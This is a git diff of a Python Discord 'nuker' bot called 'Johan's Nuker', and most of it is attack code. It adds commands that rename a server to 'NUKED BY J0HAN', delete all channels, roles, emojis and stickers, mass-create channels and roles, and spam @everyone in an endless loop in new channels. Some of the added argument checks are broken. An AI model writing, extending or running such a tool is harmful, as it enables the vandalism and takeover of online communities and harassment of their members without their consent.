@@ -9,6 +9,7 @@ print(Fore.WHITE)
 try:
     with open("config.txt") as file:
         token = file.readline()
+        userID = file.readline()
         prefix = file.readline()
 except:
     print(Fore.RED + "Error: Check your 'config.txt' file for any mistakes")
@@ -20,31 +21,51 @@ client = discord.Client(intents=discord.Intents.all())
 
 print(Fore.BLACK)
 
-# Main
+# Console
 @client.event
 async def on_ready():
-    print(Fore.WHITE + f"User: {client.user}")
+    print(Fore.BLUE + """
+     ██╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
+     ██║██╔═══██╗██║  ██║██╔══██╗████╗  ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
+     ██║██║   ██║███████║███████║██╔██╗ ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+██   ██║██║   ██║██╔══██║██╔══██║██║╚██╗██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+╚█████╔╝╚██████╔╝██║  ██║██║  ██║██║ ╚████║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
+ ╚════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+""")
+    user = await client.fetch_user(userID)
+    print(Fore.WHITE + f"Bot: {client.user}")
+    print(f"User: {user}")
     print(f"Prefix: {prefix}")
 
+# Main
 @client.event
 async def on_message(message):
     msg = message.content
-    if msg.startswith(f"{prefix}help"):
-        print(Fore.GREEN + f"\n'{prefix}help' command used!")
-        try:
-            await message.reply(f"""💥 **Johan's Nuker**
-                                Revamped help menu soon that'll be an embed!
-                                **Commands:**
-                                * {prefix}nuke - Automatic nuke
-                                * {prefix}del - Deletes all channels & roles
-                                * {prefix}cdel - Deletes all channels
-                                * {prefix}rdel - Deletes all roles
-                                * {prefix}channels [amount] [name] - Creates a specified amount of channels with the given name
-                                * {prefix}roles [amount] [name] - Creates a certain amount of roles with whatever name you want
-                                """)
-        except:
-            print(Fore.YELLOW + f"Warning: '{prefix}help' command unsuccessfully ran")
-        
+    
+    # Commands
+    async def message_spam(channel, message):
+        while True:
+            try:
+                await channel.send("@everyone " + message)
+                print(Fore.GREEN + "Spam message sent!")
+            except:
+                print(Fore.YELLOW + "Unable to send spam message.")
+                await asyncio.sleep(0.1)
+    
+    async def mass_channel_ping(amount, channel_name, spam_message):
+        print(Fore.WHITE + "\nBeginning mass channel ping...")
+        channels_made = 0
+        while int(channels_made) < int(amount):
+            try:
+                new_channel = await message.guild.create_text_channel(channel_name)
+                channels_made += 1
+                print(Fore.GREEN + "Text channel created!")
+                await message_spam(new_channel, spam_message)
+            except:
+                print(Fore.YELLOW + "Unable to create text channel.")
+                await asyncio.sleep(0.3)
+        print(Fore.WHITE + "Mass channel ping has been finished!")
+
     async def del_channels():
         print(Fore.WHITE + "\nDeleting all the channels...")
         for channel in message.guild.channels:
@@ -64,6 +85,26 @@ async def on_message(message):
             except:
                 print(Fore.YELLOW + "Unable to delete role.")
         print(Fore.WHITE + "All roles that can be deleted have been deleted.")
+
+    async def del_emojis():
+        print(Fore.WHITE + "\nDeleting all the emojis...")
+        for emoji in message.guild.emojis:
+            try:
+                await emoji.delete()
+                print(Fore.GREEN + f"Emoji deleted!")
+            except:
+                print(Fore.YELLOW + "Unable to delete emoji.")
+        print(Fore.WHITE + "All emojis that can be deleted have been deleted.")
+    
+    async def del_stickers():
+        print(Fore.WHITE + "\nDeleting all the stickers...")
+        for sticker in message.guild.stickers:
+            try:
+                await sticker.delete()
+                print(Fore.GREEN + f"Sticker deleted!")
+            except:
+                print(Fore.YELLOW + "Unable to delete sticker.")
+        print(Fore.WHITE + "All stickers that can be deleted have been deleted.")
     
     async def mass_channels(amount, channel_name):
         print(Fore.WHITE + "\nMass channel creation is in progress...")
@@ -92,31 +133,71 @@ async def on_message(message):
         print(Fore.WHITE + "Mass role creation has been finished!")
 
     # Commands (feel free to rename)
-    if msg.startswith(f"{prefix}nuke"):
-        await message.guild.edit(name="NUKED BY J0HAN")
-        await del_channels()
-        await del_roles()
-        await mass_channels(5, "johan-was-here")
-        await mass_roles(5, "J0HAN WAS HERE")
-        print(Fore.GREEN + "\nNuke has been finished!")
+    try:
+        if msg.startswith(f"{prefix}help"):
+            print(Fore.WHITE + f"\n'{prefix}help' command used!")
+            try:
+                await message.reply(f"""💥 **Johan's Nuker**
+Revamped help menu soon that'll be an embed!
+**Commands:**
+* {prefix}nuke - Automatic nuke
+* {prefix}mcp [amount] [channel name] [spam message] - Creates channels and then pings everyone
+* {prefix}del - Deletes all channels, roles, emojis, and stickers
+* {prefix}cdel - Deletes all channels
+* {prefix}rdel - Deletes all roles
+* {prefix}edel - Deletes all emojis
+* {prefix}sdel - Deletes all stickers
+* {prefix}channels [amount] [name] - Creates a specified amount of channels with the given name
+* {prefix}roles [amount] [name] - Creates a certain amount of roles with whatever name you want""")
+                print(Fore.GREEN + "Help message successfully sent!")
+            except:
+                print(Fore.YELLOW + "Unable to send help message.")
 
-    if msg.startswith(f"{prefix}del"):
-        await del_channels()
-        await del_roles()
-        print(Fore.GREEN + "Deletion of channels & roles has been complete!")
-    
-    if msg.startswith(f"{prefix}cdel"):
-        await del_channels()
+        if msg.startswith(f"{prefix}nuke"):
+            await message.guild.edit(name="NUKED BY J0HAN")
+            await del_channels()
+            await del_roles()
+            await mass_channels(5, "johan-was-here")
+            await mass_roles(5, "J0HAN WAS HERE")
+            print(Fore.BLUE + "\nNUKE OVER!")
 
-    if msg.startswith(f"{prefix}rdel"):
-        await del_roles()
+        if msg.startswith(f"{prefix}mcp"):
+            command = msg.split(" ")
+            await mass_channel_ping(command[1], command[2], command[3])
 
-    if msg.startswith(f"{prefix}channels"):
-        command = msg.split(" ")
-        await mass_channels(command[1], command[2])
+        if msg.startswith(f"{prefix}del"):
+            await del_channels()
+            await del_roles()
+            await del_emojis()
+            await del_stickers()
+            print(Fore.BLUE + "\nMASS DELETION OVER")
+            
+        if msg.startswith(f"{prefix}cdel"):
+            await del_channels()
 
-    if msg.startswith(f"{prefix}roles"):
-        command = msg.split(" ")
-        await mass_roles(command[1], command[2])
+        if msg.startswith(f"{prefix}rdel"):
+            await del_roles()
+
+        if msg.startswith(f"{prefix}edel"):
+            await del_emojis()
+
+        if msg.startswith(f"{prefix}sdel"):
+            await del_stickers()
+
+        if msg.startswith(f"{prefix}channels"):
+            command = msg.split(" ")
+            if not command[1] == None:
+                if command[1] == isinstance(command[1], int):
+                    if not command[2] == None:
+                        await mass_channels(command[1], command[2])
+
+        if msg.startswith(f"{prefix}roles"):
+            command = msg.split(" ")
+            if not command[1] == None:
+                if command[1] == isinstance(command[1], int):
+                    if not command[2] == None:
+                        await mass_roles(command[1], command[2])
+    except:
+        print(Fore.RED + "Looks like you encountered an unknown error.")
 
 client.run(token)
